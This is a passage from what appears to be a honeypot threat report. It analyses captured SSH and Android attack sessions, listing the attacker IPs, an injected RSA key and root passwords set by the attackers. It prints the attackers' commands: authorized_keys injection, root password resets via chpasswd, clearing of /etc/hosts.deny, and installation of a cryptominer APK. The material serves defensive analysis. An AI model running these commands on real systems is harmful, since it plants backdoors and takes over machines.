echo "1234\n2nrGowsFwwOW\n2nrGowsFwwOW\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 563710265d0a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 104.208.108.166

#### Analysis

**Attack Type:** Backdoor installation (remote SSH access)

**Objective:** Gain persistent remote control by injecting an SSH public key into the host’s `authorized_keys` file and resetting the root password.

**Techniques & Tools:**
- `chattr -ia`, `lockr` – used to lock/disable the `.ssh` directory.
- `chmod -R go= ~/.ssh` – restricts permissions on the SSH folder.
- `echo … > .ssh/authorized_keys` – writes a new public key.
- `chpasswd` – changes root password.
- Process manipulation (`pkill -9`, removal of temporary scripts) and clearing `/etc/hosts.deny`.

**Indicators of Compromise (IOCs):**
- Attacker IP: **104.208.108.166**  
- SSH public key

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:T2UjxDfBwGvg"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 7fea34af12e2...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.103.123.67

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root credential change) with reconnaissance  
**Objective:** Gain persistent remote access as root on the target machine.  
**Techniques Used:**  
- `chattr -ia` / `lockr -ia` to lock `.ssh` directory and files  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA key  
- `chmod -R go= ~/.ssh` to restrict permissions  
- `chpasswd` to set the root password (`bn6Vs9tkN6bW`)  
- Process termination (`pkill -9 secure.sh`, `auth.sh`, `sleep`) and clearing `/etc/hosts.deny`.  
- System‑info gathering (`cat /proc/cpuinfo`, `free -m`, `df -h`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **14.103.123.67** (China)  
- RSA key string in `.ssh/authorized_keys`  
- Root password hash (`bn6Vs9tkN6bW`)  
- File names: `.ssh`, `authorized_keys`, `/etc/hosts.deny`.  

**Threat Level:** **High** – attacker has root access and a persistent SSH backdoor.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory, changed the root password, and gathered system information to establish a high‑impact backdoor for remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:bn6Vs9tkN6bW"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 52e89dbd54cf...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 201.76.120.30

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain remote SSH access (by adding a new RSA key) and collect system information to assess the target environment.  
**Techniques:**  
- `chmod -R go= ~/.ssh` – restricts group/others permissions on the SSH directory.  
- `echo … | passwd` – attempts to set a password for an account (likely root or another user).  
- `cat /proc/cpuinfo`, `free -m`, `ls`, `uname`, `top`, `whoami`, `df` – gather CPU, memory, filesystem and OS details.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **201.76.120.30**  
- RSA key string in `.ssh/authorized_keys`: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File path: `.ssh/authorized_keys`  
**Threat Level:** Medium–High (backdoor installation with potential for persistent remote access).  
**Brief Summary:** The attacker injected a new SSH key into the host’s authorized keys, restricted permissions, attempted to set a password, and performed extensive system reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "devpass\ncotExAp5qaNL\ncotExAp5qaNL"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "devpass\ncotExAp5qaNL\ncotExAp5qaNL\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: c8c4035cc53e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.14.33.177

#### Analysis

**Attack Type:** Backdoor installation / Remote access  
**Objective:** Gain privileged (root) access via SSH by injecting a malicious public key and resetting the root password.  

**Techniques & Tools Used:**  
- `chattr -ia`/`lockr -ia` to set immutable attributes on `.ssh`.  
- Creation of `/home/.ssh/authorized_keys` with a hard‑coded RSA key.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `chpasswd` to change the root password (`root:MS09CDpMStOF`).  
- Process termination commands (`pkill -9 …`) and host denial file creation (`echo > /etc/hosts.deny`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.14.33.177** (Singapore).  
- Public key string in `authorized_keys`:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- Root password change command: `echo "root:MS09CDpMStOF"|chpasswd|bash`.  

**Threat Level:** **High** – the attacker successfully installed a persistent backdoor and altered root credentials, enabling full system control.  

**Brief Summary:** The attacker injected a malicious SSH key into `/home/.ssh/authorized_keys` and reset the root password, establishing a remote backdoor for privileged access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:MS09CDpMStOF"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: fd4cb57160a8...
- **Sessions**: 1
- **Honeypot Type**: Adbhoney
- **Unique Source IPs**: 1
- **Source IPs**: 58.214.254.246

#### Analysis

**Attack Type:** Cryptomining (botnet recruitment)  
**Objective:** Deploy a mining application on the target device to harvest cryptocurrency resources.  

**Techniques Used:**  
- Android Package Manager (`pm`) to locate and install the `ufo.apk` file from `/data/local/tmp`.  
- Launching the miner’s main activity via `am start`.  
- Process monitoring with `ps | grep trinity` (likely checking for a mining process).  
- Cleanup of temporary files (`rm -rf /data/local/tmp/*`).  

**Indicators of Compromise (IOCs):**  
- Package name: `com.ufo.miner`  
- APK filename: `ufo.apk`  
- Activity: `com.example.test.MainActivity`  
- Process name searched: `trinity`  

**Threat Level:** Medium – the attacker is deploying a known cryptomining tool, but no evidence of remote download or advanced persistence.  

**Brief Summary:** The attacker installed and launched a cryptomining APK (`ufo.apk`) on an Android device, then removed temporary files, indicating a botnet mining operation.

#### Sample Commands
```
pm path com.ufo.miner
pm install /data/local/tmp/ufo.apk
rm -f /data/local/tmp/ufo.apk
am start -n com.ufo.miner/com.example.test.MainActivity
ps | grep trinity
rm -rf /data/local/tmp/*
```

---
